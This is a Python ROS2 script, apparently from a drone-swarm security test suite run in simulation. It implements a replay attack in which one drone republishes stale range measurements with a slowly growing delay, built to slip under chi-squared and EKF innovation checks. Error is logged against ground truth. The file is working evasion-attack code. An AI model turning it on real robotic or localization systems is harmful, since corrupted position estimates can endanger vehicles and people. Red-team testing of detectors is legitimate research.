#!/usr/bin/env python3
"""
Gradual Drift Replay Attack  (Enhancement 1)
=============================================
Evasion variant of the standard replay attack designed to defeat
chi-squared gating and EKF innovation checks.

Instead of a fixed 5-second replay delay, this attack *incrementally*
increases the message age by DRIFT_RATE seconds per second.  The resulting
position error grows slowly enough that each tick's innovation stays below
CHI2_THRESHOLD for longer, allowing the corrupt state to embed itself in
the EKF/WLS estimate before detection becomes possible.

Key insight: with CHI2_THRESHOLD=7.815 (3-DOF, p=0.95) and MEAS_NOISE_STD=0.05m,
a Mahalanobis distance of ~2.8 per axis is required to trigger rejection.
A gradual drift of ~0.01 m/s keeps innovations below this threshold for
the first ~28 seconds — long enough to cause irreversible estimate drift.

Evil drone: px4_2 (standard evil-drone convention across this attack suite)
Honest drones: px4_1, px4_3, px4_4, px4_5

Parameters:
  DRIFT_RATE   -- seconds of additional delay added per second of attack
  MAX_DELAY    -- cap on total replay delay (seconds)

Run:
    ros2 run swarm_discovery replay_attack_gradual
    ros2 run swarm_discovery replay_attack_gradual 0.05 60   # 0.05 s/s ramp, 60s cap

Smoke test (short run, for parameter tuning):
    SMOKE_ATTACK_SEC=20 SMOKE_WARMUP_SEC=3 \\
        ros2 run swarm_discovery replay_attack_gradual 0.1 30

STRIDE: Spoofing, Denial of Service (evasion variant)

PATCH NOTES (validation pass):
  - No logic change required: EVIL_DRONE already px4_2, matching the
    standardised evil-drone convention used across the attack suite.
  - ATTACK_SEC / WARMUP_SEC overridable via env vars for smoke testing.
  - Validation: validate_attacks.py::check_replay_gradual confirms
    current_delay_s actually ramps from 0 upward (monotonically) during
    the attack phase, rather than sitting at 0 because the buffer never
    accumulated enough history.
"""
import os, sys, csv, time, collections
import numpy as np
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import PoseStamped, PointStamped

EVIL_DRONE    = "px4_2"
HONEST_DRONES = ["px4_1", "px4_3", "px4_4", "px4_5"]
ALL_DRONES    = ["px4_1", "px4_2", "px4_3", "px4_4", "px4_5"]

DRIFT_RATE    = 0.1    # seconds of delay added per second of attack
MAX_DELAY     = 30.0   # cap — beyond this PX4 may start dropping messages
BUFFER_SEC    = 35.0   # keep enough history for the max delay
WARMUP_SEC    = float(os.environ.get("SMOKE_WARMUP_SEC", 10.0))
ATTACK_SEC    = float(os.environ.get("SMOKE_ATTACK_SEC", 90.0))
PUBLISH_HZ    = 25.0
LOG_FILE      = "/tmp/replay_attack_gradual_metrics.csv"


class GradualReplayAttack(Node):
    def __init__(self, drift_rate, max_delay):
        super().__init__("replay_attack_gradual")
        self.drift_rate  = drift_rate
        self.max_delay   = max_delay
        self.start_time  = time.monotonic()
        self._buffer     = {}
        self.est         = {d: None for d in HONEST_DRONES}
        self.gt          = {d: None for d in ALL_DRONES}

        pairs = [(o, d) for o in ALL_DRONES for d in ALL_DRONES if o != d]
        for pair in pairs:
            self._buffer[pair] = collections.deque()

        for observer in ALL_DRONES:
            for observed in ALL_DRONES:
                if observer == observed:
                    continue
                self.create_subscription(
                    PointStamped,
                    f"/{observer}/coop/range_to/{observed}",
                    lambda msg, o=observer, d=observed: self._on_range(o, d, msg), 10)

        for drone in ALL_DRONES:
            self.create_subscription(PoseStamped,
                f"/sim/ground_truth/{drone}/pose",
                lambda msg, d=drone: self.gt.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y,
                    msg.pose.position.z])}), 10)
        for drone in HONEST_DRONES:
            self.create_subscription(PoseStamped,
                f"/{drone}/coop/self_estimate",
                lambda msg, d=drone: self.est.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y,
                    msg.pose.position.z])}), 10)

        self._replay_pubs = {}
        for observed in HONEST_DRONES:
            self._replay_pubs[(EVIL_DRONE, observed)] = self.create_publisher(
                PointStamped, f"/{EVIL_DRONE}/coop/range_to/{observed}", 10)

        self._csv_file = open(LOG_FILE, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        header = ["t_s", "phase", "current_delay_s", "mean_msg_age_s"]
        for d in HONEST_DRONES:
            header += [f"{d}_est_x", f"{d}_est_y", f"{d}_est_z",
                       f"{d}_gt_x",  f"{d}_gt_y",  f"{d}_gt_z",
                       f"{d}_error_m"]
        self._csv.writerow(header)

        self.create_timer(1.0 / PUBLISH_HZ, self._tick)
        self.get_logger().warn(
            f"[GRADUAL-REPLAY] drift={drift_rate}s/s max_delay={max_delay}s "
            f"warmup={WARMUP_SEC}s attack_window={ATTACK_SEC:.0f}s")

    def _on_range(self, observer, observed, msg):
        buf = self._buffer[(observer, observed)]
        buf.append((time.monotonic(), msg))
        cutoff = time.monotonic() - BUFFER_SEC
        while buf and buf[0][0] < cutoff:
            buf.popleft()

    def _current_delay(self, elapsed):
        attack_elapsed = max(0.0, elapsed - WARMUP_SEC)
        return min(self.drift_rate * attack_elapsed, self.max_delay)

    def _tick(self):
        elapsed = time.monotonic() - self.start_time
        now     = time.monotonic()
        phase   = "warmup" if elapsed < WARMUP_SEC else "attack"
        delay   = self._current_delay(elapsed)
        ages    = []

        if elapsed > ATTACK_SEC:
            self.get_logger().info("[GRADUAL-REPLAY] Complete.")
            self._csv_file.flush(); self._csv_file.close()
            self.destroy_node(); return

        if phase == "attack":
            for observed in HONEST_DRONES:
                buf   = self._buffer[(EVIL_DRONE, observed)]
                stale = self._pick_at_delay(buf, now, delay)
                if stale is None:
                    continue
                wall_t, msg = stale
                ages.append(now - wall_t)
                replay = PointStamped()
                replay.header.stamp    = self.get_clock().now().to_msg()
                replay.header.frame_id = "world"
                replay.point.x = msg.point.x
                replay.point.y = msg.point.y
                replay.point.z = msg.point.z
                self._replay_pubs[(EVIL_DRONE, observed)].publish(replay)

        mean_age = float(np.mean(ages)) if ages else 0.0
        row = [f"{elapsed:.3f}", phase, f"{delay:.3f}", f"{mean_age:.3f}"]
        for drone in HONEST_DRONES:
            est, gt = self.est.get(drone), self.gt.get(drone)
            if est is not None and gt is not None:
                err = float(np.linalg.norm(est - gt))
                row += [f"{est[0]:.4f}", f"{est[1]:.4f}", f"{est[2]:.4f}",
                        f"{gt[0]:.4f}",  f"{gt[1]:.4f}",  f"{gt[2]:.4f}",
                        f"{err:.4f}"]
            else:
                row += [""] * 7
        self._csv.writerow(row)

        if int(elapsed) % 5 == 0 and int(elapsed * PUBLISH_HZ) % int(PUBLISH_HZ) == 0:
            parts = []
            for d in HONEST_DRONES:
                e, g = self.est.get(d), self.gt.get(d)
                if e is not None and g is not None:
                    parts.append(f"{d}={np.linalg.norm(e-g):.3f}m")
            self.get_logger().warn(
                f"[GRADUAL-REPLAY t={elapsed:.0f}s] delay={delay:.2f}s "
                f"age={mean_age:.2f}s | {' | '.join(parts)}")

    def _pick_at_delay(self, buf, now, delay):
        if not buf:
            return None
        target = now - delay
        candidate = None
        for entry in buf:
            if entry[0] <= target:
                candidate = entry
            else:
                break
        return candidate


def main():
    drift_rate = float(sys.argv[1]) if len(sys.argv) > 1 else DRIFT_RATE
    max_delay  = float(sys.argv[2]) if len(sys.argv) > 2 else MAX_DELAY
    rclpy.init()
    node = GradualReplayAttack(drift_rate, max_delay)
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        rclpy.shutdown()

if __name__ == "__main__":
    main()
